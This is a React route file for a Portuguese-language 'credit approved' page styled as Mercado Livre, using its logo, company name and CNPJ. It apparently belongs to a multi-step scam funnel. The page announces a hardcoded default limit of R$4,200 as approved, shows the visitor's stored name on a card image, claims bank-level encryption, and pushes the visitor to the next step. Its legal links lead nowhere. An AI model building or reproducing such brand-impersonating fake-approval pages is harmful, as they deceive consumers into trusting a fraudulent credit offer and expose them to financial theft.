import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import cartaoMao from "@/assets/cartao-mao.png";
import { FunnelSteps } from "@/components/FunnelSteps";
export const Route = createFileRoute("/aprovado")({
  head: () => ({
    meta: [
      { title: "Crédito aprovado - Mercado Livre" },
      { name: "description", content: "Seu crédito foi aprovado. Finalize seu cartão e comece a aproveitar." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Aprovado,
});

function Aprovado() {
  const navigate = useNavigate();
  const [limite, setLimite] = useState<number>(4200);
  const [nome, setNome] = useState<string>("SEU NOME");

  useEffect(() => {
    try {
      const v = sessionStorage.getItem("limiteAprovado");
      if (v) setLimite(parseInt(v, 10) || 4200);
      const n = sessionStorage.getItem("nomeTitular");
      if (n) setNome(n.toUpperCase());
    } catch {}
  }, []);


  const items = [
    {
      icon: "fa-check",
      text: "Seu limite foi aprovado! Agora vamos personalizar seu cartão exclusivo.",
    },
    {
      icon: "fa-shield-halved",
      text: "Suas informações estão protegidas com criptografia de nível bancário e tecnologia antifraude.",
    },
    {
      icon: "fa-heart",
      text: "Você está a poucos cliques de ter acesso aos melhores benefícios do mercado!",
    },
  ];

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Header */}
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={2} />

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 text-center mb-2">
            Parabéns! Seu crédito foi aprovado
          </h1>
          <p className="text-sm text-gray-600 text-center mb-4">
            Agora é só finalizar seu cartão e começar a aproveitar
          </p>

          {/* Cartão na mão com o nome do titular */}
          <div className="relative flex justify-center mb-4">
            <img
              src={cartaoMao}
              alt="Cartão Mercado Livre"
              className="w-64 h-auto object-contain drop-shadow-xl"
            />
            <span
              className="absolute text-white font-medium tracking-[0.14em] uppercase text-[11px] whitespace-nowrap"
              style={{ top: "44%", left: "28%", transform: "translateX(-50%)" }}
            >
              {nome}
            </span>
          </div>

          <div className="relative rounded-2xl bg-[#FFE600] p-6 mb-6 text-center shadow-[0_8px_24px_-8px_rgba(255,230,0,0.6)] border border-[#E6CF00] overflow-hidden">
            <div className="absolute -top-10 -right-10 w-32 h-32 rounded-full bg-white/30" />
            <div className="absolute -bottom-12 -left-10 w-28 h-28 rounded-full bg-black/5" />
            <p className="relative text-[11px] uppercase tracking-[0.18em] text-gray-800 font-semibold">
              Limite aprovado
            </p>
            <p className="relative text-4xl font-extrabold mt-2 tabular-nums text-gray-900">
              R$ {limite.toLocaleString("pt-BR")},00
            </p>
          </div>

          <div className="space-y-3 mb-6">

            {items.map((item) => (
              <div
                key={item.text}
                className="flex items-start gap-3 border border-gray-200 rounded-lg p-4"
              >
                <span className="w-10 h-10 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0">
                  <i className={`fas ${item.icon} text-gray-800`} />
                </span>
                <p className="text-sm text-gray-800 leading-snug pt-1">{item.text}</p>
              </div>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/limite" })}
            className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
          <a href="#" className="text-gray-900">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
